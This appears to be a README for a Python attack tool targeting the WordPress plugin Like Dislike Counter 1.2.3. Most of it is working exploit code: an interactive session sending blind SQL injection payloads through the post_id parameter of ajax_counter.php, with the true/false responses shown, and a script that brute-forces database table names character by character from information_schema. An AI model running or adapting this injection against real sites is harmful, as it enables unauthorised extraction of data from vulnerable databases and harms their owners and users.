# Like-Dislike-Counter-AttackTool about Database

### python 2.7.6  
### Module : requests  
### Target : Like Dislike Counter 1.2.3  
### Reference  
> [sqlinjection.net](http://www.sqlinjection.net/table-names/)  
> [Hyunmini tistory](http://hyunmini.tistory.com/59)  

##### Blind SQL Injection 반응검사  
<pre><code>  
>>> import requests
>>> url = "http://192.168.28.130/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php"  
>>> payload1 = {'post_id' : '12 and substring((select table_name from information_schema.tables limit 0,1),1,1) = char(67)', 'up_type' : 'like'}  
>>> payload2 = {'post_id' : '12 and substring((select table_name from information_schema.tables limit 0,1),1,1) = char(68)', 'up_type' : 'like'}  
>>> r1 = requests.post(url, data=payload1)  
>>> r2 = requests.post(url, data=payload2)  
>>> r1.content  
'1'  
>>> r2.content  
'0'  
</code></pre>



###### It's a python
<pre><code>  
url = input("Input Target URL : ")

if(url.startswith('http://') != 1) :
        url = "http://" + url


tableName=['']*100

x = 0

for x in range(0,101):
        for y in range(1,11):
                for z in range(32,127):
                        brute_string = '12 and substring((select table_name from information_schema.tables limit '+str(x)+',1),'+str(y)+',1) = char('+str(z)+')'
                        payload = {'post_id' : brute_string, 'up_type' : 'like'}
                        r = requests.post(url, data = payload)
                        blindRes = int(r.content)

                        if blindRes :
                                tableName[x] = tableName[x]+chr(z)
                                break
        print tableName[x]

</code></pre>
